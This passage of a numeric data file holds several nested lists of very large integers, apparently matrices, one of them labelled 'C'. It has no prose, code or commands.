8824015472917000206720411790450512237183771191506242481004472458286734180306302771535077134140310974869824994149490187278706911153351508911199945396100423, 3876667301288448450337419695620568502928647480776212939510211662936473178452557501215076729580204405922138162786815509864561346955190362360608430917597356, 769342601524567225768706704836374098270890391277886740854243853009013208582662744969776977969843451241192694367023106250130081296989405515919775329202070, 9042016406561660875190954059929987588975042067706500208937490888340504353520856320782039119457158700528744177010577119292475425165466964068867993092766978, 4442588435340853438382560662355974068899076735257785391194387439775755927464356069774420210276806349010226850958723533418684754391260823904928879441467486, 7695086238780504581865517204099945174213036368200376593873720308154702594687620188785103636176265721640101602178320863528265461345220288851052822512164051, 3734114358269419143566310566268239759441666766227236203150389993610492377115347744448235419206456696023040933872223335222781309467819479942931400104851843, 9787801166678700430116514637317614347735038419852933329705713363648227078792135841241055432079571216755523545643958069612554841787498497150707655023903191, 12522584816487070109221647401806129597628835927602045835166030019231768087580853803813027384679818853333848408545135237370509755291132502472460995019865795, 7427278792122022944858586582071669815744568792332210576075496089542077734250982202477323589255427216957270562795867627131711294693911360586977296106283685, 834496714226881999887131232761920270498809462933449624049834244293562681803437893100517504255726942835544113904337039505282246797787240732701290809233160, 12735803207573002992558304768323355709585944795840776112444588149602108414655585983828148584111742923318024799865124789500969859212501199831939993749214467, 11521062571620147474974204761547008529259196548975171041560827112482327720245358687442625458762898949386723342524888456959128203485478483030436602732885777, 11078826750148995349379928894713468396942393218471374924426217984532783023208396795833976460899808713054319059050414869851097122502883184547617358617299020, 918192686162044708096739388853146103501345279028823421443888053966726597255459953450659008683160810083859803027324400179830977297625902834363180124422781, 6348908982160782050388530691186813109860986598095353284393863808397703977871037907242653122363293485520526676751147166416217103066332074606698314774066485, 5127974365070322885146224354585283205659336459638654566937693626126040793222035980487482764307242971386337110973173511397828292469359333957281797765739490], [4551896421524213639471563391688446387516054437806654961330527664059231087178204648306413923693913550436774388095521078199076672384075490749180044874359088, 5775040693019237337781629141517210449459708374186175674701658177669484653866687393034020058478263690194271546909005274527073096742767378676506899928679901, 3371082798778854616300036952063180659219508598709062156824119072256017366228788202967026600643277163244003906556535520734014586952709244222376669418734419, 541166184595883541917582884762615180212430008809451474095839298164906145119712409383287998797979708151619103716729644179487312520326820231205061116809014, 10268884559096035644699366465271907871880524553719295879861801170174445524087337611690809627034921751664245542218928797147382143821338941035835942797977786, 1406558253958884923381382584351681501456100320750709164962599704136991092193758254725761647628864143964912924026899195691564011024395413340072912001849318, 10911991622307158664931144299854188947884033284410259113064292830309996607729128462865640050772319595444532311720507571536615166113592289557287718261437759, 11756503746377565056805357728942477380283433916655778915629202056712855345666087115270430064428441397876903552717994496067960491802118043216166986768821135, 4911451370852254364992742124939541176104033493357789226661598870794020432592369720976489270624420998666775860713081871279922733779217591840198954506838306, 11063766495036153852562270277103262130377250631407141717846069471192453632189348266997942385808795833325221430140762019717190880326786818149603086521259043, 12922646375701609240791290310436557484088120726445187739234552283374385394298200398223402777105455269691527539872606414108041915971232622351650910038181914, 12715501553988156921880572050144999314569154314635935528996340228148636530025955899280610550044739137780295373432016801001290789021525692358891775404913011, 12168457005400351360881313922507930644850170924139888668193280557672215891854834448075331534699569675873326950278743383739545970782087624815628867658729647, 1683985816118085789878651679377042880633791964329658854486172194053386548089039350474526130882571415776974774738965310035627678361345433332154282659072819, 6159415322657002682810328208153496555510598795083194730707379899626041598904194039905569137149222451421896611621910008855215236963336143073175948636105825, 6853034831344106687092681005602838245190279542086597674180674478349399041624085714442583417873916913984263779852890782596529317439827156018279002392714827, 3914261867005958112905777340233339746944217768450525098858639655677797076296780676319627432297686140584302670521566416071286520705576401771875206362913683, 13051898720820674405695875225479505874687151361354232125654693818920293229116194295183327811186060289659192215602942577597101800820514405263083146012841545, 11316450433325907185443169217476130461721772905901676190700767108973697072539439559119483739943894567036196186120398354596627991301226814839822987945497422, 6717816686532147445309748999558149318747822760510484463531844607941618767858965437121454620177687410938897207509514053409182256062987373393596411836542584, 3347407913251131825662074369607901593789213120637630155916911613425939090332595488491585789793708627060081884831973439215939161059693917876672022270500006, 4321566982685587177196125312951409914310135938662996230319435039296694596635871225364511833815495654641323824344132819645278063462586195895918724171959270, 6676664110750640229405970728734518254936676622004345716834385057342988429697757367789042173172695244699904864218705967318973595246037446517806838090522458, 8608731212067828181248975152576965938201935612434580237037030686649013971086251108675760459531331800226023934073391558401015463884920262003281673459777855, 261930356066315061979150733939675114122319372043223819547845251439145702632591689441644476814740300891053219271773934715901194313955112536628253860889933, 9917339984977161727457465110628100204284443649569498623766192359182947591744914124524038160573727094323521332678945643061080779903939964492284061287714787, 11815956031095682573181903953713201443030112774300611553218175064214791840908144244587704402822060901649908779744275067627607026290110908369710737275286087, 3376415157580495759391323204906215034458943594931957474005859033678544256320752599367476809840847914501575829435548333881838076301062588150243594438555873, 2142063490694730177592356811387276700221174637640779771205859591381323845600717968954354085717376053542388536656750906942037489001677109661175905203144881, 13087098966320826219440941363366291293560076755292766301252595973373251516839463063477188653512117268032804714265245378394763089039799321963985736426893839, 8895666730294490938693005010587311515474361535977011643993391152726330073703145138105804901470080955444190801041832432016924314369643335521469163795321866, 9181486044127742926160247791040881764307193408514872468267790406301003880590433232422026483974890066490422145572622336176190136176057056702107460967426171], [10043232114923158943534484054792194768909489338449156465254823657227360356822317602682093727995960838088598346037268645128254947786781330524961133608862384, 979787567681433024550724075543415919185672788907960534124113048750602582486575951080521703965696476718948443198019943113570678023569851818556245275923427, 1581002309510711711157605287366441591681217797057449814107790511981133222412668797825286016519997763279268804334495406243963113095092816431579666038623930, 7051762475497671555675388970168922423639252348702112882527677680635693313534437507170333270264834129934708226431968108080283107151334318518419567755659823, 10476054990390412041152240697065932508161684765973028654285640318110765275812435505676354319569301527291112426241069431498120878413574221458495764379510540, 9138454093951643448090747056353793640539279303591106629370502925914746588220932482656507736159270568200763318199048493975642282602775904795076644068021791, 12008462254513110436290372417572579544162496644098332529157482540342644914826742511231679385910522882165161959002116292239162769916499180784673850187226627, 4780036517197446572284041441585848073740769107990565423203954157996568629177775169757508477888483594849180724782812236684763995436986626095254634201829435, 6071170676122482283601220922499859444643480142132693892212488690822380210010414382379002561000105824251992918677593938160042999064764922652329172673752370, 13025015995880892652630104171070062684835627596805607642983929075594109133717596144823971216058364335154582505790218594691297218977058700648991705831859992, 2842484418197944178779671666909373580607460617863781271871978288571980349320417146028441726469191553050520266151208022579259756746626501738869630599792650, 939353605849069468251482386447120800671611219177498291404040726484471102879602704985874108852687725860419948037491882813860079097715073721617766615706577, 10279856246782775162961679647527287506718175361760447764510342675834300701690561189393895606044625137478072792151405697488617298321877041211995854519485790, 7721489411948792402573507035436187166070480203692791481413374974581881545395826736716941776141337161682196731472053413299855636579140102854645153803512889, 8583229669333957565431780196114600211775752107499101628327860781470616469085325457946328059137735513970360549831827599565252105826728355743185690235493447, 1315173849644456756683728811567190592729682815750081060852116175346004546887606835643981808228087796151266271090920718919596443023146229936723337206998171, 12849682218286834286567112593686000380140327718770433313440136811502233537300804474559652427239196907604549045049492233177429182221112080822820425135044217, 10442807619440315042863768251032693797385822571846102764405568528465716907101404311582165465450425982507543557766086320808213339587980118955915064670853465, 12940611764017941891803539971003410908968807802535878478952944283797734383639059980332236398538887108012640461013243550768035941992288081637183134058772372, 2296756343223590725791998049754656595980071750932268829110455331373042281023371354214696914886605827721934350142687867299072418315927783951161819653321350, 11876732092598870227695536862702139697206780511739625521146810111707676177694975963906040731476730227968094913145482185284446256807841048794989424061883213, 11238548366491166117337472640841809481505491374951983312923842144565148106222254942211378323621606696097124168336082085448652772740753472471723823867653808, 640287108009948571498383116789898099344614957714497423540726740357445039915746091319383574903590728564071661815914240927009230601974184126689163341290335, 5136799476909938674103600321383436125464778856934701215705316547787636176091256265118558156513787811699362948087384865439326223032875374396665513270527007, 10028193337252276247983700148249932261037713913327574325551446146663143602657593552428392776307248635473202805456638287632629461097315406322536036279170047, 13314467890155044786580817916599385328180325284525243343783562863096524593698382797236520590847145736505226990592115360337065140832013379377656076416914490, 6647197702276911513020307445236871155110320039932359446795526813993826753090718018532313949868365131599509781940468673921308200983585173542306253450954173, 10355258073149344414768385472220710859561150084983191885924478335663555437015055887831033736915642184806935651234040036299679731117058750296643473268799485, 4400854502672893465183922757667536755200943988659320723816974318260574466758269929690142308257218434054889108948054432664626352591171326059928608833387722, 5204927833215506969686547479081290688180630148778527854286937487968181285316297020877351403123405160758211018514305245881969690598117831685628933668182772, 10057468823871488676162422723252549055641810015723017974389297216785976129298681867357186548808582994628028131600712768162406141758503114201090039389192752, 6763106393567295343254272085711017772180167370375224164457948370116632271091087000453164844084320989835152716592823510667695251952137123792062892178802153], [7277513070461640354776088031593774956258974849442004853957736318892657577868221799453508453270079201764727851486211189005518007014588171191558027455276945, 373499828621705828009945210896703060453138832668394464456266862926566850939213741765740606974669497462188366968861241331783356396853153025639277110458515, 4978422185129237623694651380346662864728346524499129733647624850139062578061940182702565365103643884189663385467692561936525613934541062615577761497486000, 10181091229529556819836235373169146408552512906975872493808708356047173221234424737876620683239654131724676572031283635923420676469450957724635560417481864, 7508627062906690306268482384055401994407196591318092603620551898251990601928514155422736341112645261036443200008347060031529351143904562344133133588990178, 8180239546139034423251006328197468362298198697649532310712181621681609267986499059802845823123103262440733394663120173177681695319105889749874589504749854, 9799588712306370271864256010003520216029497678320485473722442245940849584693542939640020983508828513867712966923316264929624947362627584313344755958272196, 7477112073694523173324449401260197116402195085152842204575904741618789739500010600955473491094695649229020492603065222943381959286601515191581428353737557, 11936249461945001995087543875049457804336678486326446154936189474172797759309753133803568782957910348597681938202337441205392643767663956217619240580284459, 8099280546837616102489414804471382105174449188867010403067062981936305428930926528406679211391334903999002851413291989132064280732333727731571649441197353, 12105322126044555810025939787603239731457320420278132975412536995933670554426404900205882141193752757336098532342240686491751587859665629914587081936011407, 2957115324150829765974025340439647486466398301515233857086747113852452817443064915215296512159924095548819783155978104057831376951775802419719422460756162, 8413820384678925277506028414233447029968228891954093658691738590461292168531605098500502608820200410047903475846841876914160485057994351970573301093001676, 7296457247851789112142845899379017607523015958556756592811199815447757687295399261747749947620227866893629750095821167205235917538338011733126272944033061, 8074763362368033579804301809310051081214443347711895083278894527329780149172535330970343768085471689037693910094559481443998486645661213502484079421670035, 3930795646178272403153340977876728290726550219184452387449960442165525837720293519910600731684675049163371900083047589741270305624841264406639631621895238, 4189262683625166283216879288048136779121965302892615927302113624609062354319313126892377825988505945132735782838509694160904581938602939218250748490201829, 7457131379276509345201884627859233031657886887760225783183158403286461367477709767050825231184405976248532125441582420717726502376027510358941158881990053, 786006868424311141078030547945115058886739435235673455478697902180548041686771025745124179083749809713304129448398276742805634751003307626220154345068166, 3499851900743695050034891086192946777921984266999352233671114277531956172289105995822861355044890352838668705259416074074767104152830192821946094846650818, 11942222989195307447160990725840028587900355152904630576123048488228674938347433761672492885307683596523780150000664010815783205268471483369759020313301040, 2900852232601338964514499109878568314729489980130641597724631383043669954310444273933361211880123552605508193619573576137961311909048388357763950895998812, 1820317174669046983593835640146317968368462441929516592616027854955148253161671366244546801605267419030735316668843633855732421749986325848084523724627691, 4368186342378082591153818067160528717399844507817920795222375662610710921300387115352528946302101914136435121990399663866028487539472046427663007680064321, 9535086145930804454416987053799058057937237697963570177789674622958991699069431443119284989790394001801479398031676685506716165815838830604675691599823469, 3479126926901412228714296699990311754732648842723281916364031962822040282634095637117888528463950217291860277749225833912655521349943195754356991877456810, 12642776193289016526069232534391625291037322494010551983994884262366650662679563631975752547436008788150031062337473675957805764652216946955497984654983332, 794622821206059898970012826102453648687577825124881871285074032674431153572188414842899779308648883266367281994746012865152632152674022956645021067661889, 1994832498012878635428873422981759842235226373308025133796894112083965493638525442193562640411501281054375295996121159406893984911070149049682100174192578, 12570023313198674436677961142632735366294036572626611984460055110791286697510663833048706222580841559514349947796258278808960067934552721002104342783187112, 3719661328928338067845545656734470054847126547885049649868097114351180178988128237196812557850070795912513627355416352000567755551332596345988841658211071, 6231702895773611565685477289976165544853710949242511513660994067774793165489357426834209452412943092911917381268570727604301434816622027574248645114903829], [3424460666900472375878689798303470778950434461982177874191159099174455775005702562309329015078300061965902695325192121784491044749544639448361781150005651, 3636798561177838262993328976710207621267785950703331473673574399515100013653104982902348242065257013139286085986075671561496509219376890624525272831138039, 12589873069889621005823991312868446256763206570436764729970173307887503589676315820638405806353966239820383582353281731172308046291218305200224398389002923, 6195282700917917098445858252561664535330383899130364125258362813105083887571488083116622508429019866728640160893000863957980045864797601564878655848300661, 1417992534792626722224792553785521644215138414751491946784494092140712727983735033463615566418453124976554451771988746837270952240055067941524725222063846, 4090935774529756422794685926691647367459067557721092070168035293656738974643860919861630567753127343130314333652567109388239293837050201909433225434861257, 192706797488430704945965282198024038096617354644806639396130443265666026780125628228569553977321098082502575725218350661287604423262745070513689421401558, 4623301092636180313072584717900965873033110709665756780753753758474394029508222794596840120716274329306972163925786899502967328538144290353877674460376871, 8243613554541222248225232819913259972086067966013245360075259419765650502991444972078810312162427147278758825686824494528199525536184034459813486453322656, 4994396887321757689741668273847727040286527646423390251241462275650240583835923721494284915219020206829536119624446368961251021103086700167248815593224754, 2403541011430237660609763372805713600499179665137808821643546108539065457563722184758221689165592404863067906832012410407980081443401082925778691446832065, 7239345375820002998782593903385207302096749186956868966765310765525869448038513364437823833181400393127044223861889200088975856526481898163295485475391812, 10669573354596551668053593323935881191235889529344119117898761118071923033236393857377025979380440111384822397677394631760630568589523728667387179942884187, 148345850014379235517227816810057413777831602959545847597793580272098447995529653311987629481637417415146952591676843494753324068292019124674934672438943, 3250598771869336395755121191304675249642540505522233832230469469715016604072659060659200785672184024396786403155417799631091912146637917163110158744090866, 6938404952745484307643734469861329148835445089384004953673591459380554471247022991320981985275922533227594532214159411414204968727459436850500268821270105, 7693794634767548614135901468955659561379426670379156320598972780910840967286495246365031999825308718276423798621045712572340915493130219564489561812294695, 7623300956155878529530698776552243688920580880542042886893350099330138656283551030528870651729732628865065499174982352219770193186595359886902258460738007, 3851067883315188708182259862953473908242722414989651071163672603711811573941551569360467095164017160522794165466879516497589498035096850295736149268275057, 13373589834463005244949897882834162345735494875390777613995589705069338755071766706124702533342899036706153118559106903516634505645198603495245273638324156, 8716559769800044806166340111418207686599269879999396678000255391725110544588650675510712617877805709422506791412069542663843482914275825008076426537553995, 1600572227264921104036353341497896507270659359679056065553978684899546530766776254851828485204512532370670857536298507768602009373855522078606620975171113, 231294226590324609864970313031025098520399699442909254503355314379677059144005819790894846975250220755745867104249041166658997396838054818963166751428689, 12805688233587714667037620138670470245876189438029831660225819892258394228269052413852396933315532934486229273287517460955344076610976495219662540179591993, 2997254124133918995619264579677841581107093539365714051737367782312447610054516072094014589335335533425826714345400459442358784018988928544313440003702847, 1280816082848196875546006336365946179238752990882380670242210393124991171569984531836386170781047201864810211289125264716217577758765748524177966609919278, 1709016080020911900426862156773206924135379130091214994086478700752022805178175738124429066544718481787903070844193171218296938401670878218812727546681580, 1177581514539100212508118146443800342022604607257104781733040467055730357279615005314402674609054736248979064288237581604876407934581696711517715050391399, 323331101913957540901905509035660174702477231512370989542955575606736130165490719010485378681196202441512325913183451117347999819102719184462087359710532, 10643475147932407157885910685235083433545388797888852012509054619782510421407621456585632269182473218449358367748888400882670074218086018377962707842399928, 5661194762717211150963449588001754302297788770541861849855336668401974115964125910682239608466291673682909164349139689135131903011119009673238296610828843, 12933216947634825901922897553101262729829564536221445111873114310167065770743757409403570352540106185280868733189593033566770368351780582967533588373000152]]#C=[[30406143803180684731512312275815313997697316080430915683616402436599504174024392577781336065851728329947688563789464615054231555415648550203663544416942360754, 28729080395577392309402695034394384532207606627850209597171663292309774479629004461529418818632140338433815621785425924508230656619613059740998951799905784622, 33291580934827392386355974581549510217376477657062689517442314962975076052412655244437922372620851192991005444845831588926945760124101758387179749744393462811, 32541289464653512787888125623111296016083074306735533230985516457175857067047958345415401907192187184028646288262562423787908999847126485429744214961845954353, 26012051401152773353701079981400782307308356315180015308006766852140344248298312020340138921525137192505406598982736200751931753771461509990629259052031581418, 27830579417175255309115907504409779662765107925412508734305539342789345273800051280069728202797474320015127327659624475050527389581359762791943278872597845084, 27543815280677089643386557681408782559032139833312243028345699019039353142820603185718380972056972866437468951502269440029784233017355825581578979525758074178, 27876607207285068746308011666112411108283583716789018464319183764138485873582129232465109094592267661577227891561334063065257231960638191827367569439442860182, 25223326191580630480038085171565703102770899627551986859179129432292131433786880110192345006745279657239452324642230355440162619262188066152146801163781127884, 24633798692982737297088477097561686248164281053168211832031130260965981563956880533197387572401985726691983348960000733955517248440427240720498222230797868515, 23695699819402345137568319760965878101722961123740106096594554973939780962464135162385390755449649702510653678591441045152602332585444698053288983748233054830, 28422159824201600035582119465108918271631348217403051203875501871979200341138732110468146916520942684019353999711151372525610828356250387179316150843694447321, 32750468225452707232727156058249598636945133431571662675646305702506837723660193660958668126126797243426029276796189564051151258002145467623066691408404103391, 29733611359527599170377219846295153143398775587781256352480466113044133510790376627022615645233457883267405666035225545316194636782102654801188151691838288857, 27960360401148456903075210654272227238683995973605109155713525780328659827039097487896556690782711027939214671009972702365014950028992467063722122863674617772, 31242954045897224472098736299272363291006384106499778371757157792039729488089193425251045543397853167189118421555354635191037371550056294811908752197204662724, 29680425698754545779798821333620477854804545661963772000146372119418941000606046675283525921702510407968069266046242654160008366948247590899081145285729527584, 31832437504208663484545022892390890677878088661455673529402074060916642988163991763609338372275792670693601215915088487620187192439518742339621990902479018683, 24044851013939373263343805299377154324928714081712525145539750079462692508289410207401775138096896764971988101664668780889431267924401176204590310725922810008, 28088278467733707121601560651168001899553347339965093577712086132814900998019270215879947672436415765447235024720372896918962156149325412969248260417144228322, 28341698508223364525130876754266857685999282104707505123321041284004097122005940460102150069526994007812310979201770412341850900243409168442143780088903167590, 29763846200708638193630713578903562126821402088145999925928034684316968415285178621444002622297188391123627602672846030748535095813688436956971423705975363728, 25153279155333267246795957134401495801729324689611193249590446394711282107549307905256735619757206758335849240488767837922940545911081378540647432421135516742, 26795395091441055511797875939856904937663807302747793680473627482876441404936299325819448747628850679591008318298298948499137740333757733385840433436645841331, 32875191660322232628691114292526125330067836194754181521560985954450484687482571005944168209384936837221412187514142881644160080835593355197520637094136004913, 31381372693864349281784350953031413664437621275226298468316031622698981884432044275775231134587833100848978114805790137399965211232572896100003489640765763903, 31217977769163855034723918005827834933660203083921004204728617596804586551155900830663505063432278286911278845202735814018455418360172393103061357522901479670, 24285276001643224917785670454120081055429638984644104374313641229975926171416040014248721169878218015306554707253846142241854341473760001265432277436765603845, 25136417929804842778884290644907276238010403987596600292895734116343643073275354949650318576943305149017464612771703822105305990967570960061953139173453326709, 32005212412175561126639777072699548208437679652011406520218470750168771676616478393251374719932169785734690446036413095989265916552413474654465642778848826310, 26948045929723955549478774470140298990836878210658149461718169897879877201763616259269214883683852201708114438263261915824122957579854005862379145127945281682, 34498303915801659593069924198970010858206308631716822443655175000480817718596985233691774233755494393755328312487747916420863308731193669692756814683218244689], [25397897421713487493584789189583529158789073092562327077974057548497991710157147403549677697536007533351606861388680268004137631890114684664440320386107880705, 24308216334481177607113862140959973726314164206973489155165977282680716589918837277817765915856731045262272286760642710400217152729033754157308824181691488485, 30414260651004952966825628026552026345644624786350755244527340954633572216521455229793483175305131092629674314983299889984844698110016643647709593282645056496, 27812020484854237782101707703281892573251685193004503638660612157123015474007927620060931516653538132450371765167406456150530400160774002608492939504031534094, 21199283886028953795645641106044908754698947222357664251427136929315061261386513201880307416881017703580498997935799877643585044357386037223643717345177988145, 22685544656379204787701995580419317918557318156168262601321001692143017248893387022765116601126507845248704670630622242624826188098660165790224250570651811784, 23031080454025933742385812479499890415881130195753087468686297251798417133970835846878529550786790318487425510325722232675355816081888440145197735482481648529, 25288307835451520278786505758006216039906556946298344218396152587197444786880306309074258964463212197974299108853729438029795825130895987923738073287814285269, 23913509850400752399110625337810258196318585413240630003943111597816842620139996889687955399205594356194482496330383682981134496397658431754014234981039861968, 21156222078141734726634900773303421904883237132754605677545919442582240673129529922787055111606937403618418990653880258118209679461219278506725476499282119620, 19706148991717807893303713091723016829028398026946269884616338591619842775368758097058477265662277621662548428316258427732661071296783489350962454498736624300, 25836603497566486121975567542646728040653409055618547324542923443407835930016821496575382585966975824231664678664920888361303608898976130590548797288962745258, 28244113503129040208155044658296908135769932502828563647799196694264028293340654490083551042121523282018223024363635904918417359246957039933546555657545236550, 26463631575448345490716259802771361137358890183173588364760359138856201640750665392586985287217109236040238657280436196204269744122246819993593249017563624702, 24743112847562923234064158329252732633632909621906774658432430386096932208000819531947913780010861094110764355508399301027195820032263427848380760072709349622, 28305624698523905432082381143713411746989588424719793732018622619254469663944940263118887025119166879752862511023183147412888044663994360299524972899234060335, 25823523719519061430385051662333862927394038609176561749924103792337100322881957791569885032548916827403844800451115756512370561829730837925363224971123618224, 30067500510404294544980396282353395433737930775328461390978473845148728668270071627586887539242379050037906614587264594738756818869174570046486678078170930383, 22751772445943996508720238575577795482001306548367469431063712178073113331983307242130987322092367184581586166296196744395551460767568599688783002274054574745, 21485362328964428709946957311851768203777365344826639638808550996107454372775298937364849213477024365078424804851376374478905925015959369701144209584149675267, 22851616804827223588672067866335238329391604866025524380742537077947599639602138780341861694320577339430460947707601503819126724358843481796687288310543317455, 26076546498022501920549100896818280764268047947277661902841020994803860310796490625116445604109857625657105723104443533386281261262928147671054863218605997575, 22192149897610825186164989135382027821876057188300310610238158175985932623566504841842628434084460517123901957827454697240546294310504973249143029125837152960, 25407749853142686401829589452233737212485773577604689695702679793222084763133449933229717636358257766046369623838077524897129914391090777112814232439654751373, 28438955465100625521225701008941246178493171791824342100839929268679518445765710220107720134097622249384116374888996692939043505451555072625388162288344947539, 25147544583723041258281484748456071442954884707374084612123094497377902371034765324249744004725008521610588705663362055342630962807973163882137205237271586493, 26191719191539518889816809511024776866771450147442668030546348770651831359199898809665471275797241941197944669189387213692771053175138082952127093488462066768, 21784107143231887766005911636456903310286860603151441374513781655142794391461332452400255769446023127795011319982596125685692722354100598863970878125535428129, 22414809535660489754690971430938886457678402564161069095511055796329479593107876669279110834114728552903044711570639329510070035654863590516729992954285296695, 27932204403711862586115365430453984075280382431597844910409532743253397754626160554159692961832687997021371394942068759511252813067019168968984185765443725822, 21834800986360641774022375562441017639139918583385204386582016103004858551465388119688159749810392817811583118723756651085743538930404024495917331987286941895, 26620118587326944376909212244523214771417181340949640352462078351804968810586614525115895109503005402174312481459853226105344646972727341386432109106601248204], [27676542894165635386049447171223515866924551380515912072169194720431632655868807889408406077478084874722770629183973283733838344478513304531998572254830717595, 22352521099529998680040441691327028506021472569200703988761390763717040452441356405203848874936555157910355957405792543965533283009250802011734824973479578114, 34201383647701368241422616355571587293224223192207442657187704528052189825152780449807238372057895221533949708114543679690075574150662202858499879813333068816, 28857172863997566510198807857483955802257838991180658001879842024003785973036727543786784711123707659647701797689252919261850000948509196740967456946430601891, 26247809178822527223966875017254883626806049546110260405232209577609848863327275174617853520931108019400812486690272108398814425005720352103767871805360588682, 24687663436070564329749487917739791522641006357338474114216686666577311176943470078001663286949292062645633809966597793491230823452554598871071276218473496409, 28625625129140932582660764783663838963954999138686599826590399195077300994580066466945723966587739666459968515189013495490846738949518586524534848460364416282, 27107595786305091686941548045866242782913224427826644239744887038128807674183121133742705028317771632713027340591332154945584652907530241092342708614497547071, 22399926706596031263054043656499188567444801368403298814932332506222393905891781407804599427117699278325514175029986309707001771115649303804842598402202477949, 24867558393883749955352408146913728707007861393545985059960743815204933315800287817021294122884591580317693798532742055601431837372807965845740040306902123321, 23721506926031312710923502625236593571899516149087201206764458950310174310216781513422973265934599497221672689240158480573907809538075829765900132157727192625, 25638374233822121249164962428498908682460722294423104146932468237828279213615585370838257510649304039424294081041919105268062084885055967173749665425280161602, 28444111345600519223734139437895324184166271263284960034394569084788294494090977564387018537732366599651156292402646644499417121905425641479770392757268061841, 28042104385474009975380505228052371638526276278658258217694692939753537471720046298022750976628483076226758709964555836879568597714302486722827874285442278902, 24372691615193511239742552287064068657889384259951920084980472510968173225410133474279128875828109426446874850522159310620840372770654701191719278943842200812, 30694189345203689446472978901041706244622668336634020517285052760241353239055041891071555827632212149114867387837129938733014056448495541515487789344547503444, 31287194819654670315140650619575369994340852765230662626022856752590753135548590114189902937076261482214046653711162509646851920025494515042332282184807649961, 28073670660784371144046629514250966318902356185772187552457459733112161470633358867531913535730293301088210332607641134733476802503371798690723571324884905246, 24753655363313974785292258301228820651582997599404279142718817570025029981428465408485122546179049831672364471526568882593046667647822096456156648122759785644, 25392289244206633169652127456080795333890439500138012602504944097516965099917890820191886761478628488327874992019285466203146690815539156119715743109773749972, 27560318468477614905315085562459479472874686872901922748896060322770888231665884056164377682211877459817013811050534787710069003557660831708711903307370428767, 26146388790361724474945657790069842559042010806932734933402946598934613509635386652507485692180176268013211965055188043816960261002341109213645838445878905812, 23563154389741149531630825407153768513904859822960977258854481434711441461875152292900360925292299097340316300182217818825293661977397742090644417910069577611, 23226093256217338243751321162182020588655414265849642926150394981058225231196119087274341218586824197592680036107937920503677948783460111616721506440352757631, 31778483036585220412053311738530270658081458769959635495226880850358054920759347316189084913523542164106847405991656953630017742202587080222140256032520582280, 30329781881775109097986615782032347785619816842685852252970579318396091119148261341382684451021993654591192402487613958004787854546188492782108051317211253778, 29468398104091770790030119659452584132010576855344462199480583742320722025015898161896093604408859396008080111837908364326577354098821984343225909954579309411, 23863749467880493313889652748758684044757598943678421388565931543088255257461357133087883411045982121791733200850092260240735175071850868688306005231161935271, 25052203762078314581788199070163985142854376372915155172019770938687871625178959106363055336443524263897364638484378789831551329635009958002489264011702632817, 31263902599480186161502210803197238017920697013132326046513939793235998928778861590081651540810138707229687069603464370501729800963763163845120802444823088408, 22711568596054993057658455937668955118330661850250087108141815206685334241102136891515378618030778872097894351486995681957535018430124441390839241780904377645, 29115749477465971074263675205731592019746412346000801793701052118276099316518686996551554715942486953458667344633565084922998198067678628387921421266588021024], [29741763275191247584353116581618729361951346223590778547504090718790318830936368461420459661908896866041535100129479080474761826572448482404991921308761400434, 27747088651216900457554494078397865233800916408653955187106589342304852205649744749814228357514664101763365421352572559965267598871954037986453363708644004307, 32795799037385451828807886014115126125584689670706902457732964788031716340558710131974661865642013886590128007620640436077567882492132647754814341809917491997, 28785720894773118493235887206044612916628053654036904592964885554907558251269193832727577155493253542290330139991610541912901818329443267787607836189302438176, 27257263071959757938202584855747927861547795820168085567540059936595468230498039699912652689610620882458546298276375965100579337435809635102299667857065819198, 26599321323957901640941323703641007037992816666085865706013184835603990951351513801717267299445618603177537597553109696164073776849542083261964657163312092373, 24344170147616942815119216248312485723454078342030402253619597027731534651738670081716605171597687856920317831882121034107203743147696321580799671918018492300, 26968756303904594487050463649859039836082725327428582723856831790670094354295931547040267218124868895959808849623967719769825373769811731180298115620753193378, 24374766939126621566051422196195155485205001055394634209215815161161812149002639167309508857775761603994588689037610628746000566961252540792393774565767043246, 25459704750631995842994651258269407394369769200240228420014808630553439081019739345523191213020684342807513913847695923461647992153469629688552767766734992349, 25195200760703040264495470046520455805081233745668956910018177709410273841860462501842409164377205205848603471412210790316904812044861353791743480676926417622, 27398979230764344877675764725988030485453982515108995650516572089091580339217445320463294110430233390887782493731463928654467267497484182507915524750140247802, 29184809561126714819499112610838755580868924945070916468866152357783285686314209483134458193976548086021964969495068264651803209194504935310797172790418763010, 27993668119877544622478877400999043871360663148576327441905337457251412492632171229947986100685030204580099429382221880077155137312380044729548094266353517124, 28696983572461024691342389105795449802528902711552209974601209649466987446343616696211204992335761696200097607210221158383772039577956648956777276469813135689, 25831089331169425858602802470143549744898943871502247324992725109343466728959183904586333682042353074624742874280477872277848142943134227062997922008479267142, 30588731319846891602610543550061845750156825374261122225122129652615340915374516809583496587308025192959973376187266879557472997810138647495728600967519279820, 28084661749894781159604336232067685073393106101428595117445468994332821428173224630492490854834856087755379435325010713982107459401446963686414368752115424700, 23464829852645607871700000959506851866968470131892420187895725387987603746752050063590065854329755235434078570976936641536898704335575384585184584145828933612, 28985793855795983982399023422853991142622609076104966266928959879527923405511470983892205005958741745537983802799124475483854755681441230288451312707470825573, 29170432860462696112406658133417164577805025435645236162266427573762500770052114217752904499772616919421144982257562284070354565172244588816724986847404398013, 28833607505086409845664278457168106226032781155337884772167973643286121324558055257290997084611643725312951320128048783168517834154808419192098665259116978473, 25681569264326925675874282685895518886945428718187290862257856943215139777425896117639028489283367634034871951370362837046725504777066588271377055068614084518, 23133798420015407399277752674436749577433607241252868926038240130081887925035909616441539053453857359220514623671463239496137178000140328029238324532719468878, 33730705148872846296985705262820814922871871841614320007034988467410005927452650221100686428405284906132222180515032229999376095261864620558416803009301361962, 25117006989263134377744608389166901231200902986189438869245766604880866732418105556609323930593585524199463154931016075885114268547741947529099436200824803311, 29730801859838286722758466170899960962912461039868124755421882252902636508978714032183961491427160374612965525072809097628426562722416697831546469537537935923, 21091483684922190493684138614131701533116377990324360321414009073326605742993780844203759832474952565218827111191503381395272675671234476040067672592716863422, 25437350730248058575150648481828788113897995962771033047733912287272216018781764103617604104534472648215638085040172600281962568349687035768161804061205164381, 30737031917911828810546403792802654801198307197589521235631042156796354132405747460660917206321643137460691211931923799592989529761020533220336671646920138947, 28942673781045277924051917824703423663932357166810607168656677832008361485170212547332837038493328998070860529840811790687406121285000711282880977095550246689, 31071553960828139369891023029545370060978194241313271917731077761553921363624265002467524104400362352478583032692197134552687542502019991745498822582657030670], [23331519476485674627147228559643818217371448058687175116983873058529325152043234765099186584209221090473941281428151478746083145277130844120040366580547039476, 22236964298214848107619016138589018102412223583185202478262729387412622322233260533117910012953714588406876003054096747614877352239159922556882155687345852419, 